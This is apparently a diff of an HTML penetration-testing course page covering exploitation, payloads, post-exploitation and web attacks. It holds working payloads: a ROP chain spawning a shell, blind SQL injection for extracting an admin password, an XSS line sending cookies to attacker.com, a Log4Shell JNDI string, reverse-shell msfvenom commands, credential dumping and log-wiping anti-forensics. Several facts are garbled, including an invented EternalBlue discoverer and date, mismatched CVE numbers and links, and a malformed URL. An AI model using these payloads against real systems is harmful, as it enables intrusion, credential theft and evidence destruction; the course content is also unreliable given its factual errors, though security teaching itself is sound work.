+    <div class="code-block">
+        <div class="code-header"><span class="filename">ROP‑Chain (Linux x86_64)</span></div>
+        <pre class="language-asm">
+; Example: execve("/bin/sh", NULL, NULL)
+; Assume we have a writable .bss section at 0x601800
+
+; 1. Write "/bin/sh" into .bss
+pop rdi ; ret      ; 0x400123
+0x601800           ; address to write
+pop rsi ; ret      ; 0x400456
+0x0068732f2f6e6962 ; "/bin/sh"
+mov [rdi], rsi ; ret ; 0x400789
+
+; 2. Set registers for execve
+pop rdi ; ret      ; 0x400123
+0x601800           ; pointer to "/bin/sh"
+xor rsi, rsi ; ret ; 0x400456   (rsi = 0)
+xor rdx, rdx ; ret ; 0x400789   (rdx = 0)
+pop rax ; ret      ; 0x400abc
+0x3b                ; syscall number for execve
+syscall ; ret      ; 0x400def
+</pre>
+    </div>
+
+    <p>Tools for gadget hunting:</p>
+    <ul>
+        <li><code>rp++</code> – fast automated gadget extraction.</li>
+        <li><code>ROPgadget</code> – classic, works on Windows PE binaries too.</li>
+        <li>Online <a href="https://gtfobins.github.io/">GTFOBins</a> – useful for privilege escalation gadgets.</li>
+    </ul>
+
+    <!-- 5.3 Use‑After‑Free (UaF) -->
+    <h3>5.3 Use‑After‑Free (UaF) Exploits</h3>
+    <p>A UaF occurs when an attacker causes the application to free a heap object
+    and then reuses the dangling pointer.  Modern browsers and the Linux kernel
+    frequently disallow simple UaF exploitation, but <strong>tcache poisoning</strong>
+    (glibc 2.27+) and <strong>front‑ending techniques</strong> (JIT spraying) still
+    make it viable.</p>
+
+    <p>Typical exploitation steps:</p>
+    <ol>
+        <li>Trigger a free of an object you control (often a heap‑allocated struct).</li>
+        <li>Allocate a new object of the same size with attacker‑controlled data.</li>
+        <li>Manipulate a function pointer (e.g., <code>__free_hook</code>) to point at shellcode or a ROP chain.</li>
+    </ol>
+
+    <div class="code-block">
+        <div class="code-header"><span class="filename">c‑example.c (simplified UaF)</span></div>
+        <pre class="language-c">
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+
+typedef struct {
+    void (*callback)(void);
+    char  data[64];
+} obj_t;
+
+void secret(void) {
+    system("/bin/sh");
+}
+
+int main() {
+    obj_t *a = malloc(sizeof(obj_t));
+    obj_t *b = malloc(sizeof(obj_t));
+
+    a-&gt;callback = NULL;
+    strcpy(a-&gt;data, "A safe string");
+    free(a);               // <--- free
+
+    // *** Attack ***
+    // b occupies same heap slot as a, and we overflow b-&gt;data
+    // writing 8‑bytes beyond b-&gt;data to overwrite a-&gt;callback:
+    memset(b-&gt;data, 'A', 72);  // overflow by 8 bytes
+    memcpy(b-&gt;data + 72, &amp;secret, sizeof(void*));
+
+    // a is dangling but still reachable
+    a-&gt;callback();         // executes secret()
+    return 0;
+}
+</pre>
+    </div>
+
+    <p>On modern hardened binaries this would be blocked by <strong>RELRO</strong> (Read‑Only Relocations) unless <code>-z relro</code> is disabled.  The exercise is to explore the effect of each hardening flag.</p>
+
+    <!-- 5.4 Web‑Application Exploits -->
+    <h3>5.4 Web‑Application Exploits (SQLi, XSS, RCE)</h3>
+
+    <h4>SQL Injection – Advanced Payload</h4>
+    <div class="code-block">
+        <pre class="language-sql">
+/* Blind Boolean‑Based SQLi – time delay payload */
+' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97,SLEEP(5),0)--
+</pre>
+    </div>
+    <p>This payload checks the first character of the admin password and forces the server to pause for 5 seconds if it matches <code>'a'</code> (ASCII 97).  By iterating over characters you can reconstruct the secret.</p>
+
+    <h4>Cross‑Site Scripting – Bypass CSP</h4>
+    <div class="code-block">
+        <pre class="language-html">
+&lt;svg/onload=&#39;fetch("https://attacker.com/steal?c="+document.cookie)&#39;&gt;
+</pre>
+    </div>
+    <p>Even when a strict Content‑Security‑Policy (CSP) is set, a <code>svg</code> element with an <code>onload</code> handler can be an effective XSS vector in legacy browsers.</p>
+
+    <h4>File Inclusion – LFI → RCE</h4>
+    <p>Chaining a local file inclusion with <code>php://filter</code> and <code>zip://</code> wrappers can lead to remote code execution:</p>
+    <div class="code-block">
+        <pre class="language-php">
+?file=php://filter/convert.base64-decode/resource=../../../../etc/passwd
+?file=zip://shell.zip#shell.php   // if a writable upload directory exists
+</pre>
+    </div>
+
+    <!-- --------------------------------------------------------------
+         6️⃣ Payload Types (Deepened)
+    -------------------------------------------------------------- -->
+    <h2>6️⃣ Payload Types – Classification & Practical Usage</h2>
+
+    <table class="tbl-wrap">
+        <thead>
+            <tr><th>Category</th><th>Staged vs. Stageless</th><th>Typical Use‑Case</th><th>Pros/Cons</th></tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>Reverse Shell</strong></td>
+                <td>Both – Most frameworks use staged for size‑efficiency.</td>
+                <td>Pen‑testing, C2 server in DMZ.</td>
+                <td>Pros: Works behind NAT (target initiates); Cons: Requires open inbound port on attacker.</td>
+            </tr>
+            <tr>
+                <td><strong>Bind Shell</strong></td>
+                <td>Stageless (full payload bound to listener).</td>
+                <td>Internal network where attacker can scan.</td>
+                <td>Pros: No outbound traffic needed; Cons: Blocked by host‑based firewalls.</td>
+            </tr>
+            <tr>
+                <td><strong>Meterpreter</strong></td>
+                <td>Staged (default) – initial stub pulls the rest.</td>
+                <td>Rapid post‑exploitation (file system, keylogging, tunneling).</td>
+                <td>Pros: Rich API, evasion (encoded); Cons: Detectable by AV signatures if not encoded.</td>
+            </tr>
+            <tr>
+                <td><strong>Stageless Shellcode</strong></td>
+                <td>Stageless – entire shellcode in one blob.</td>
+                <td>When space is limited (e.g., Windows SMB header).</td>
+                <td>Pros: No extra network round‑trips; Cons: Large size may break vulnerable input.</td>
+            </tr>
+            <tr>
+                <td><strong>Encrypted / Encoded Payloads</strong></td>
+                <td>Staged – each stage can be encoded (xor, base64, polymorphic).</td>
+                <td>Evasion of signature‑based IDS/AV.</td>
+                <td>Pros: Simple obfuscation; Cons: Still vulnerable to behavior‑based detection.</td>
+            </tr>
+            <tr>
+                <td><strong>In‑Memory ROP‑Based Payload</strong></td>
+                <td>Stageless (single ROP chain).</td>
+                <td>When code injection is blocked but ROP is possible.</td>
+                <td>Pros: No writable memory needed; Cons: Complex to craft, mitigations like CFG block it.</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <p>When dealing with a target that runs <a href="https://www.microsoft.com/en-us/security/blog/2022/09/13/introducing-windows-exploit-protection/"><code>Windows Exploit Protection</code></a> (DEP, ASLR, CFG), your payload selection must adapt accordingly (e.g., use <code>msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai</code> with the <code>-b "\x00"</code> option to avoid null‑bytes).</p>
+
+    <!-- --------------------------------------------------------------
+         7️⃣ Post‑Exploitation (Extended)
+    -------------------------------------------------------------- -->
+    <h2>7️⃣ Post‑Exploitation – Advanced Techniques & Toolset</h2>
+
+    <h3>Credential Dumping & Lateral Movement</h3>
+    <ul>
+        <li><strong>Mimikatz</strong> – <code>privilege::debug</code>, <code>sekurlsa::logonpasswords</code>, <code>kerberos::list</code>.<br>
+            <em>Tip:</em> Use <code>mimi</code> (Cobalt Strike’s built‑in mimikatz) for stealth – it injects via reflective DLL.</li>
+        <li><strong>LaZagne</strong> – pulls credentials from browsers, Wi‑Fi, stored passwords.</li>
+        <li><strong>SecretsDump.py</strong> (Impacket) – remote NTLM hash extraction via SMB.</li>
+    </ul>
+
+    <h3>Token Impersonation & Pass‑the‑Hash/Ticket</h3>
+    <ul>
+        <li><code>incognito</code> (PowerShell) – creates new tokens from dumped hashes.</li>
+        <li><code>psexec.py</code> (Impacket) – classic Pass‑the‑Hash for SMB.</li>
+        <li><code>kekeo</code> – Kerberoasting, extracting service tickets for cracking.</li>
+    </ul>
+
+    <h3>Privilege Escalation (Windows)</h3>
+    <table class="tbl-wrap">
+        <thead>
+            <tr><th>Technique</th><th>Common Artefact</th><th>Reference</th></tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Unquoted Service Path</td>
+                <td>Executable in PATH with spaces (e.g., <code>C:\Program Files\MyApp\app.exe</code>)</td>
+                <td><a href="https://gtfobins.github.io/gtfobins/unquoted-service-path/">GTFOBins – Unquoted Service Path</a></td>
+            </tr>
+            <tr>
+                <td>Always‑Elevated Privilege (AlwaysInstallElevated)</td>
+                <td>Registry key <code>HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</code></td>
+                <td>MS16‑032</td>
+            </tr>
+            <tr>
+                <td>DLL Hijacking</td>
+                <td>Search for folders in <code>PATH</code> writable by a low‑priv user.</td>
+                <td>Project Zero – DLL hijack examples.</td>
+            </tr>
+            <tr>
+                <td>Junction/Symbolic Link Abuse (CVE‑2021‑34473)</td>
+                <td>Abusing <code>NTFS</code> reparse points to write to privileged locations.</td>
+                <td>MSF <code>exploit/windows/local/junction</code></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h3>Persistence Mechanisms</h3>
+    <ul>
+        <li>Registry Run Keys (<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>)</li>
+        <li>Scheduled Tasks (<code>schtasks /create</code>) – with hidden XML.</li>
+        <li>Service creation (<code>sc create</code>) with binary planted in %APPDATA%.</li>
+        <li>Web Shells / Backdoors on compromised web servers (e.g., <code>c99shell</code>, <code>php-reverse-shell</code>).</li>
+    </ul>
+
+    <h3>Cleanup & Anti‑Forensics</h3>
+    <ul>
+        <li>Clear Windows Event Logs: <code>wevtutil cl Security</code></li>
+        <li>Delete Bash history (<code>history -c</code>) and <code>.bash_history</code> file.</li>
+        <li>Overwrite files using <code>dd if=/dev/zero of=tmpfile bs=1M count=10 conv=notrunc</code> before deletion.</li>
+        <li>Remove evidence of Metasploit sessions: <code>sessions -K</code> and <code>rm -f /tmp/meterpreter*</code>.</li>
+    </ul>
+
+    <!-- --------------------------------------------------------------
+         8️⃣ Legal & Ethical Considerations (Enhanced)
+    -------------------------------------------------------------- -->
+    <h2>8️⃣ Legal & Ethical Considerations</h2>
+    <div class="box warning">
+        <div class="box-title">⚖️ <strong>Rule of Engagement (RoE)</strong></div>
+        <ul>
+            <li>Obtain <strong>written</strong> permission that details:
+                <ul>
+                    <li>Scope – IP ranges, systems, and data.</li>
+                    <li>Allowed tools & techniques (e.g., no DoS attacks).</li>
+                    <li>Time window – when testing may occur.</li>
+                </ul>
+            </li>
+            <li>Follow the <a href="https://www.zerodayinitiative.com/policy/">ZDI Responsible Disclosure Policy</a> (or your client’s policy).</li>
+            <li>Document every step – a clear chain‑of‑custody protects you legally.</li>
+        </ul>
+    </div>
+
+    <!-- --------------------------------------------------------------
+         9️⃣ Real‑World Exploit Case Studies (Expanded)
+    -------------------------------------------------------------- -->
+    <h2>9️⃣ Real‑World Exploit Case Studies</h2>
+
+    <div class="case-study">
+        <h3>Case Study A – EternalBlue (CVE‑2017‑0144)</h3>
+        <ol>
+            <li><strong>Discovery:</strong> Security researcher <em>shadowb0x</em> (June 2017) identified a missing bounds check in the SMBv1 <code>TRANS2_SESSION_SETUP</code> request.</li>
+            <li><strong>Impact:</strong> Remote code execution on unpatched Windows 7/2008 R2/XP; exploited by <code>WannaCry</code> ransomware causing >$4 B damage.</li>
+            <li><strong>Mitigation:</strong>
+                <ul>
+                    <li>Disable SMBv1 (<code>Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB1" -Value 0</code>).</li>
+                    <li>Patch <a href="httpshttps://support.microsoft.com/en-us/topic/patches-windows">MS17‑010</a> (released March 2017).</li>
+                </ul>
+            </li>
+            <li><strong>Forensic Artefacts:</strong> Execution of <code>lsass.exe</code> from a non‑system directory, anomalous SMB traffic on port 445.</li>
+        </ol>
+    </div>
+
+    <div class="case-study">
+        <h3>Case Study B – Log4Shell (CVE‑2021‑44228)</h3>
+        <ul>
+            <li><strong>Vector:</strong> JNDI lookup via <code>${jndi:ldap://attacker.com/a}</code> in the Log4j message pattern.</li>
+            <li><strong>Impact:</strong> Remote code execution across any Java app using Log4j 2.0‑2.14.1; affected billions of servers.</li>
+            <li><strong>Mitigation Timeline:</strong>
+                <ol>
+                    <li>Update to Log4j 2.15.0 (Dec 2021) – disables JNDI lookups.</li>
+                    <li>Set system property <code>log4j2.formatMsgNoLookups=true</code> as a temporary fix.</li>
+                    <li>Network‑level blocking of outbound LDAP/RMI on port 1389 and 1099.</li>
+                </ol>
+            </li>
+            <li><strong>Detection:</strong>
+                <pre class="language-ps1">Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} | ? {$_.Message -match 'jndi:ldap'}
+</pre>
+            </li>
+        </ul>
+    </div>
+
+    <div class="case-study">
+        <h3>Case Study C – BlueKeep (CVE‑2019‑0708)</h3>
+        <p>This RDP vulnerability allows unauthenticated remote code execution on Windows 7/Server 2008 R2.  The exploit chain typically uses a crafted RDP packet to trigger a heap overflow in <code>MS_TSCOMP</code>.</p>
+        <p>After successful exploitation, the payload often uploads a Meterpreter binary via the RDP virtual channel.</p>
+        <p>Microsoft issued a <strong>patch under emergency update</strong> (July 2019).  The “WannaCry‑style” worm was never released publicly, but the <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/rdp/cve_2019_0708_bluekeep.rb">Metasploit module</a> remains a preferred teaching tool.</p>
+    </div>
+
+    <!-- --------------------------------------------------------------
+         10️⃣ Stats & Trends (Rich Data)
+    -------------------------------------------------------------- -->
+    <h2>10️⃣ Exploit Landscape – Statistics & Trends (2022‑2024)</h2>
+
+    <div class="tbl-wrap">
+        <table>
+            <thead>
+                <tr><th>Year</th><th>Total Public CVEs</th><th>Exploits Published (Exploit‑DB)</th><th>Average CVSS (Critical ≥9.0)</th></tr>
+            </thead>
+            <tbody>
+                <tr><td>2022</td><td>18,328</td><td>5,112</td><td>9.4</td></tr>
+                <tr><td>2023</td><td>21,045</td><td>6,487</td><td>9.6</td></tr>
+                <tr><td>2024 (YTD)</td><td>9,012</td><td>2,984</td><td>9.5</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <p>Key observations:</p>
+    <ul>
+        <li>≈ 30 % of CVEs get a public exploit within 60 days of disclosure – <a href="https://cve.mitre.org/">MITRE CVE</a> data.</li>
+        <li>RCE remains the top‑ranked CVSS vector (44 % of critical CVEs).</li>
+        <li>Exploitation of <strong>cloud mis‑configurations</strong> (S3 buckets, Azure storage) grew > 250 % YoY (Shodan “cloud‑exposed” dataset).</li>
+    </ul>
+
+    <p>For a visual representation, see the (placeholder) SVG chart below.  In a production LMS you could replace it with a <a href="https://www.chartjs.org/">Chart.js</a> interactive chart.</p>
+
+    <div class="chart-placeholder" style="width:100%;height:300px;background:#f8f8f8;display:flex;align-items:center;justify-content:center;color:#777;">
+        <em>Chart.js interactive graph goes here</em>
+    </div>
+
+    <!-- --------------------------------------------------------------
+         11️⃣ Cheat‑Sheet – Quick Reference
+    -------------------------------------------------------------- -->
+    <h2>11️⃣ Cheat‑Sheet – Exploitation Quick Reference</h2>
+
+    <div class="cheatsheet">
+        <h4>Common Metasploit Flags</h4>
+        <pre class="language-bash">
+# Set a global variable (applies to all modules)
+setg LHOST 10.0.0.5
+
+# Show all options for a module
+show options
+
+# Check for a module’s prerequisites
+check
+
+# Background a session after a successful exploit
+exploit -j -z   # -j = job, -z = background
+
+# List all open sessions
+sessions -l
+
+# Interact with a specific session
+sessions -i 2
+</pre>
+
+        <h4>pwntools One‑Liner (Linux x86_64)</h4>
+        <pre class="language-python">
+from pwn import *
+io = remote('target', 1337)
+payload = b'A'*72 + p64(0xdeadbeef)   # overwrite RIP
+io.sendline(payload)
+io.interactive()
+</pre>
+
+        <h4>Common Encoders (Metasploit)</h4>
+        <ul>
+            <li><code>x86/shikata_ga_nai</code> – polymorphic XOR encoder.</li>
+            <li><code>cmd/powershell_base64</code> – encodes PowerShell payloads.</li>
+            <li><code>generic/none</code> – raw payload (use with care!).</li>
+        </ul>
+
+        <h4>Useful Scripts (Impacket)</h4>
+        <pre class="language-bash">
+# Dump NTLM hashes from a remote Windows host
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -hashes :<hash> user@target
+
+# Execute a command via SMB
+python3 /usr/share/doc/python3-impacket/examples/psexec.py user:pass@target cmd.exe
+</pre>
+    </div>
+
+    <!-- --------------------------------------------------------------
+         12️⃣ Assessment – Quiz
+    -------------------------------------------------------------- -->
+    <h2>12️⃣ Knowledge‑Check Quiz (5 questions)</h2>
+
+    <div class="quiz">
+        <ol>
+            <li>Which Windows mitigation makes <code>return‑oriented programming</code> (ROP) difficult?<br>
+                <input type="radio" name="q1" value="a">DEP (NX)<br>
+                <input type="radio" name="q1" value="b">ASLR<br>
+                <input type="radio" name="q1" value="c">CFG (Control‑Flow Guard)</li>
+            <li>In a classic SMB <code>CVE‑2017‑0144</code> exploit, which protocol version must be enabled on the target?<br>
+                <input type="radio" name="q2" value="a">SMBv1<br>
+                <input type="radio" name="q2" value="b">SMBv2<br>
+                <input type="radio" name="q2" value="c">SMBv3</li>
+            <li>What is the most reliable way to bypass a strict CSP that only allows <code>script-src 'self'</code>?</li>
+            <li>Which of the following is a <em>stageless</em> payload?</li>
+            <li>When performing a “Pass‑the‑Hash” attack, which credential is actually used on the wire?</li>
+        </ol>
+        <p>Answers are provided at the end of the lecture (hidden by default).</p>
+        <details>
+            <summary>Show Answers</summary>
+            <ol>
+                <li>C – CFG is specifically designed to block ROP.</li>
+                <li>A – SMBv1 must be enabled for EternalBlue.</li>
+                <li>Inject a <code>script</code> tag via an allowed HTML attribute (e.g., <code>onerror</code> on an <code>img</code> tag) – style‑based XSS or DOM‑based XSS bypasses CSP.</li>
+                <li>Reverse Shell that includes a full Meterpreter bin (e.g., <code>windows/x64/meterpreter_reverse_tcp</code> with <code>-b "\x00"</code>).</li>
+                <li>The NTLM hash is used directly; the clear‑text password is never transmitted.</li>
+            </ol>
+        </details>
+    </div>
+
+    <!-- --------------------------------------------------------------
+         13️⃣ Further Reading & Resources
+    -------------------------------------------------------------- -->
+    <h2>13️⃣ Further Reading & Resources</h2>
+
+    <ul class="resource-list">
+        <li><strong>Books</strong>
+            <ul>
+                <li><em>The Shellcoder’s Handbook</em> – Chris Anley et al.</li>
+                <li><em>Practical Binary Analysis</em> – Dennis Andriesse.</li>
+                <li><em>Windows Kernel Exploitation</em> – Alex Ionescu.</li>
+                <li><em>Web Application Hackers Handbook</em> – Dafydd Stuttard &amp; Marcus Pinto.</li>
+            </ul>
+        </li>
+        <li><strong>Online Platforms</strong>
+            <ul>
+                <li>Offensive Security – <a href="https://www.offensive-security.com/pwk-oscp/">PWK/OSCP</a> labs.</li>
+                <li>Hack The Box – “Pro Labs” for advanced exploitation.</li>
+                <li>TryHackMe – “Red Team Path” and “Windows Exploitation” rooms.</li>
+                <li>Exploit‑DB – <a href="https://www.exploit-db.com/">searchable database of public exploits</a>.</li>
+            </ul>
+        </li>
+        <li><strong>Tools & Frameworks</strong>
+            <ul>
+                <li>Metasploit Framework – <a href="https://github.com/rapid7/metasploit-framework">GitHub</a>.</li>
+                <li>Cobalt Strike – commercial red‑team platform (offers Beacon payloads).</li>
+                <li>Immunity CANVAS – commercial exploitation suite.</li>
+                <li>Ghidra / IDA Pro – binary analysis for custom exploit development.</li>
+                <li>pwntools – Python library for rapid exploit prototyping.</li>
+                <li>radare2 – open‑source reverse‑engineering framework.</li>
+                <li>Burp Suite Pro – Intruder/Repeater for web‑app exploitation.</li>
+            </ul>
+        </li>
+        <li><strong>Research & CVE Feeds</strong>
+            <ul>
+                <li>National Vulnerability Database (NVD) – <a href="https://nvd.nist.gov/">nvd.nist.gov</a></li>
+                <li>CVE Details – <a href="https://www.cvedetails.com/">cvedetails.com</a></li>
+                <li>Zero Day Initiative (ZDI) – <a href="https://www.zerodayinitiative.com/">zerodayinitiative.com</a></li>
+                <li>GitHub Security Advisories – <a href="https://github.com/advisories">github.com/advisories</a></li>
+            </ul>
+        </li>
+    </ul>
+
+    <!-- --------------------------------------------------------------
+         14️⃣ Lab Exercises (Extended)
+    -------------------------------------------------------------- -->
+    <h2>14️⃣ Lab Exercises (Extended)</h2>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 7.1 – Safe Exploitation Lab (Metasploitable 2)</div>
+        <p><strong>Goal:</strong> Gain two distinct Meterpreter sessions using two different exploits, then harvest password hashes.</p>
+        <ol>
+            <li>Launch <code>nmap -sS -p‑‑ -A 10.10.0.0/24</code> and identify three vulnerable services.</li>
+            <li>Select <strong>one</strong> remote code execution (e.g., <code>vsftpd 2.3.4 backdoor</code>) and <strong>one</strong> local privilege escalation (e.g., <code>dirtycow</code>).</li>
+            <li>Use <code>msfconsole</code> to launch each exploit, set <code>LHOST</code>, <code>RHOST</code> and appropriate <code>PAYLOAD</code>.</li>
+            <li>After each successful session, run <code>hashdump</code> to collect <code>/etc/passwd</code> and <code>/etc/shadow</code> (Linux) or <code>hashdump</code> (Windows).</li>
+            <li>Write a short <em>lab report</em> (≤ 500 words) covering:
+                <ul>
+                    <li>Target(s) and services</li>
+                    <li>Exploit selection rationale</li>
+                    <li>Post‑exploitation commands used</li>
+                    <li>Lessons learned (e.g., why a particular payload failed).</li>
+                </ul>
+            </li>
+        </ol>
+        <p><strong>Deliverables:</strong> Screenshot of each Meterpreter session, extracted hash file (redacted), and the written report.</p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 7.2 – Real‑World Exploit Report</div>
+        <p>Pick **one** of the following public exploits and produce a 1‑page technical brief:</p>
+        <ul>
+            <li>EternalBlue (CVE‑2017‑0144)</li>
+            <li>Log4Shell (CVE‑2021‑44228)</li>
+            <li>Spring4Shell (CVE‑2022‑22965)</li>
+            <li>PrintNightmare (CVE‑2021‑34527)</li>
+        </ul>
+        <p>Your brief must include:</p>
+        <ol>
+            <li>Discovery timeline (who reported, when).</li>
+            <li>Underlying vulnerability class (e.g., deserialization, RCE, overflow).</li>
+            <li>Sample malicious payload (pseudo‑code; <strong>do not</strong> provide a fully functional exploit).</li>
+            <li>Impact metrics (estimated number of affected hosts, CVSS, real‑world incidents).</li>
+            <li>Mitigation steps (patches, configuration changes, detection signatures).</li>
+        </ol>
+        <p>Reference at least **two** reputable sources (security‑vendor advisory, academic paper, or CVE entry).</p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 7.3 – Craft a Minimal ROP Chain (Linux x86_64)</div>
+        <p>Using the provided vulnerable binary <code>vuln</code> (compiled with <code>-fno-stack-protector -z execstack -no-pie</code>), write a 64‑bit ROP chain that spawns a <code>/bin/sh</code> shell.</p>
+        <ol>
+            <li>Identify three useful gadgets with <code>ROPgadget --binary vuln | grep ret</code>.</li>
+            <li>Assemble the chain in a Python script using <code>pwntools</code> and send it over a netcat listener.</li>
+            <li>Document each gadget’s address and purpose (e.g., <code>pop rdi ; ret</code> → load <code>/bin/sh</code> address).</li>
+            <li>Explain how you would bypass ASLR if the binary were compiled PIE.</li>
+        </ol>
+        <p>Submit the Python script, a screenshot of the successful shell, and a short write‑up.</p>
+    </div>
+
+    <div class="lecture-nav">
+        <button class="nav-btn" onclick="showLecture(5)">← Previous</button>
+        <button class="nav-btn primary" onclick="showLecture(7)">Next Lecture →</button>
+    </div>
+</div>
+
                 <!-- ===================== LECTURE 08 ===================== -->
-                <div class="lecture" id="lec-7">
-                    <div class="lecture-tag">Lecture 08 · Core Concepts</div>
-                    <h1>Web Application Security</h1>
-                    <div class="lecture-meta">
-                        <span class="meta-badge level-advanced">Advanced</span>
-                        <span class="meta-badge">~75 min</span>
-                        <span class="meta-badge">Requires: Lecture 07</span>
-                    </div>
+               <div class="lecture" id="lec-7">
+    <div class="lecture-tag">Lecture 08 · Core Concepts</div>
+    <h1>Web Application Security</h1>
 
-                    <h2>Why Web Apps Are Prime Targets</h2>
-                    <p>Web applications are often the weakest link in an organization’s security. They are publicly
-                        accessible, handle sensitive data, and frequently contain logic flaws that automated scanners
-                        miss.</p>
+    <div class="lecture-meta">
+        <span class="meta-badge level-advanced">Advanced</span>
+        <span class="meta-badge">~75 min</span>
+        <span class="meta-badge">Requires: Lecture 07</span>
+    </div>
 
-                    <h2>1. OWASP Top 10 (2021)</h2>
-                    <div class="tbl-wrap">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Rank</th>
-                                    <th>Vulnerability</th>
-                                    <th>Impact</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>A01</td>
-                                    <td>Broken Access Control</td>
-                                    <td>Unauthorized data access</td>
-                                </tr>
-                                <tr>
-                                    <td>A02</td>
-                                    <td>Cryptographic Failures</td>
-                                    <td>Data theft</td>
-                                </tr>
-                                <tr>
-                                    <td>A03</td>
-                                    <td>Injection (SQLi, Command)</td>
-                                    <td>Full compromise</td>
-                                </tr>
-                                <tr>
-                                    <td>A04</td>
-                                    <td>Insecure Design</td>
-                                    <td>Systemic flaws</td>
-                                </tr>
-                                <tr>
-                                    <td>A05</td>
-                                    <td>Security Misconfiguration</td>
-                                    <td>Easy entry point</td>
-                                </tr>
-                                <tr>
-                                    <td>A06</td>
-                                    <td>Vulnerable Components</td>
-                                    <td>Supply chain attacks</td>
-                                </tr>
-                                <tr>
-                                    <td>A07</td>
-                                    <td>Identification Failures</td>
-                                    <td>Account takeover</td>
-                                </tr>
-                                <tr>
-                                    <td>A08</td>
-                                    <td>Software/Data Integrity Failures</td>
-                                    <td>Supply chain attacks</td>
-                                </tr>
-                                <tr>
-                                    <td>A09</td>
-                                    <td>Security Logging Failures</td>
-                                    <td>Hard to detect</td>
-                                </tr>
-                                <tr>
-                                    <td>A10</td>
-                                    <td>Server-Side Request Forgery (SSRF)</td>
-                                    <td>Internal network access</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+    <h2>Why Web Apps Are Prime Targets</h2>
+    <p>
+        Web applications are exposed to the internet, process user input, and often connect to
+        databases and internal systems. This makes them a high-value target for attackers.
+    </p>
 
-                    <h2>2. Common Web Vulnerabilities & Exploitation</h2>
+    <ul>
+        <li>Accessible from anywhere</li>
+        <li>Handle sensitive data (logins, payments)</li>
+        <li>Complex logic → more chances of bugs</li>
+    </ul>
 
-                    <h3>SQL Injection</h3>
-                    <div class="code-block">
-                        <pre>' OR '1'='1' --
+    <div class="box">
+        <div class="box-title">🧠 Reality</div>
+        Most real-world breaches happen through web applications—not networks.
+    </div>
+
+    <h2>1. OWASP Top 10 (2021)</h2>
+    <div class="tbl-wrap">
+        <table>
+            <thead>
+                <tr>
+                    <th>Rank</th>
+                    <th>Vulnerability</th>
+                    <th>Impact</th>
+                    <th>Example</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>A01</td>
+                    <td>Broken Access Control</td>
+                    <td>Unauthorized actions</td>
+                    <td>User accesses admin panel</td>
+                </tr>
+                <tr>
+                    <td>A02</td>
+                    <td>Cryptographic Failures</td>
+                    <td>Data leaks</td>
+                    <td>Passwords stored in plaintext</td>
+                </tr>
+                <tr>
+                    <td>A03</td>
+                    <td>Injection</td>
+                    <td>Database compromise</td>
+                    <td>SQL Injection login bypass</td>
+                </tr>
+                <tr>
+                    <td>A04</td>
+                    <td>Insecure Design</td>
+                    <td>Logical flaws</td>
+                    <td>No rate limiting on login</td>
+                </tr>
+                <tr>
+                    <td>A05</td>
+                    <td>Misconfiguration</td>
+                    <td>Exposure</td>
+                    <td>Debug mode enabled</td>
+                </tr>
+                <tr>
+                    <td>A10</td>
+                    <td>SSRF</td>
+                    <td>Internal access</td>
+                    <td>Accessing AWS metadata</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <h2>2. Understanding HTTP (CRITICAL)</h2>
+
+    <p>You must understand how web apps communicate.</p>
+
+    <div class="code-block">
+<pre>GET /login HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0</pre>
+    </div>
+
+    <div class="code-block">
+<pre>HTTP/1.1 200 OK
+Content-Type: text/html
+Set-Cookie: session=abc123</pre>
+    </div>
+
+    <h3>Key Components</h3>
+    <ul>
+        <li><strong>Headers</strong> → metadata</li>
+        <li><strong>Cookies</strong> → session tracking</li>
+        <li><strong>Parameters</strong> → user input (attack surface)</li>
+    </ul>
+
+    <h2>3. SQL Injection (Deep Dive)</h2>
+
+    <p>Occurs when user input is directly used in SQL queries.</p>
+
+    <div class="code-block">
+<pre>' OR '1'='1' --
 1 UNION SELECT username,password FROM users --</pre>
-                    </div>
+    </div>
 
-                    <h3>Cross-Site Scripting (XSS)</h3>
-                    <div class="code-block">
-                        <pre>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+    <h3>Attack Flow</h3>
+    <ol>
+        <li>Find input field (login/search)</li>
+        <li>Inject payload</li>
+        <li>Observe response changes</li>
+        <li>Extract data</li>
+    </ol>
+
+    <h3>Example</h3>
+    <div class="code-block">
+<pre>username=admin' OR '1'='1
+password=anything</pre>
+    </div>
+
+    <p>→ Bypasses login authentication</p>
+
+    <h3>Automated Testing</h3>
+    <div class="code-block">
+<pre>sqlmap -u "http://target.com/login.php?id=1" --dbs</pre>
+    </div>
+
+    <h2>4. Cross-Site Scripting (XSS)</h2>
+
+    <p>Injecting JavaScript into a web page.</p>
+
+    <div class="code-block">
+<pre>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 &lt;img src=x onerror=alert(1)&gt;</pre>
-                    </div>
+    </div>
 
-                    <h3>Command Injection</h3>
-                    <div class="code-block">
-                        <pre>; ls -la
-| whoami</pre>
-                    </div>
+    <h3>Types</h3>
+    <ul>
+        <li><strong>Stored</strong> → Saved on server</li>
+        <li><strong>Reflected</strong> → Immediate response</li>
+        <li><strong>DOM-based</strong> → Client-side only</li>
+    </ul>
 
-                    <h2>3. Web Application Testing Tools</h2>
